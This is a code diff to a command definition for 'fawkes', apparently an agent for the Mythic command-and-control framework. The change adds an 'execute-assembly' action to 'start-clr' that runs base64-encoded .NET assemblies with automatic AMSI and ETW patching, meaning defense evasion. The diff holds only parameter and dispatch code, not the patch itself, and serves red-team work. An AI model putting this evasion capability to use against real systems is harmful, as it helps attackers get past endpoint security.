@@ -14,9 +14,9 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "start-clr",
-		Description:         "Initialize the .NET CLR runtime with optional AMSI/ETW patching",
-		HelpString:          "start-clr",
-		Version:             2,
+		Description:         "Initialize .NET CLR runtime or execute assemblies with auto AMSI/ETW patching. Use -action execute-assembly for single-command assembly execution (like Cobalt Strike's execute-assembly).",
+		HelpString:          "start-clr                                           # Init CLR only\nstart-clr -action execute-assembly -assembly <b64>   # Execute assembly with auto-patching\nstart-clr -action execute-assembly -assembly <b64> -arguments 'arg1 arg2'",
+		Version:             3,
 		MitreAttackMappings: []string{"T1055.001", "T1620", "T1562.001"},
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
@@ -26,6 +26,37 @@ func init() {
 			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
+			{
+				Name:          "action",
+				CLIName:       "action",
+				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:   "Action: init (default, initialize CLR with optional patching) or execute-assembly (single-command assembly execution with auto AMSI+ETW patching)",
+				Choices:       []string{"init", "execute-assembly"},
+				DefaultValue:  "init",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, UIModalPosition: 0, GroupName: "Default"},
+				},
+			},
+			{
+				Name:          "assembly",
+				CLIName:       "assembly",
+				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:   "Base64-encoded .NET assembly bytes (for execute-assembly action)",
+				DefaultValue:  "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, UIModalPosition: 5, GroupName: "Default"},
+				},
+			},
+			{
+				Name:          "arguments",
+				CLIName:       "arguments",
+				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:   "Arguments to pass to the assembly's Main() method (for execute-assembly action)",
+				DefaultValue:  "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, UIModalPosition: 6, GroupName: "Default"},
+				},
+			},
 			{
 				Name:             "amsi_patch",
 				ModalDisplayName: "AMSI Patch Method",
@@ -99,6 +130,11 @@ func init() {
 				TaskID:  taskData.Task.ID,
 			}
 
+			action, _ := taskData.Args.GetStringArg("action")
+			if action == "" {
+				action = "init"
+			}
+
 			amsiPatch, err := taskData.Args.GetStringArg("amsi_patch")
 			if err != nil {
 				logging.LogError(err, "Failed to get amsi_patch arg, defaulting to None")
@@ -111,12 +147,29 @@ func init() {
 				etwPatch = "None"
 			}
 
-			displayParams := fmt.Sprintf("CLR Init | AMSI: %s | ETW: %s", amsiPatch, etwPatch)
+			var displayParams string
+			if action == "execute-assembly" {
+				arguments, _ := taskData.Args.GetStringArg("arguments")
+				if arguments != "" {
+					displayParams = fmt.Sprintf("execute-assembly (args: %s)", arguments)
+				} else {
+					displayParams = "execute-assembly"
+				}
+			} else {
+				displayParams = fmt.Sprintf("CLR Init | AMSI: %s | ETW: %s", amsiPatch, etwPatch)
+			}
 			response.DisplayParams = &displayParams
 
 			params := map[string]interface{}{
+				"action":     action,
 				"amsi_patch": amsiPatch,
 				"etw_patch":  etwPatch,
+			}
+			if action == "execute-assembly" {
+				assembly, _ := taskData.Args.GetStringArg("assembly")
+				arguments, _ := taskData.Args.GetStringArg("arguments")
+				params["assembly"] = assembly
+				params["arguments"] = arguments
 			}
 
 			paramsJSON, err := json.Marshal(params)
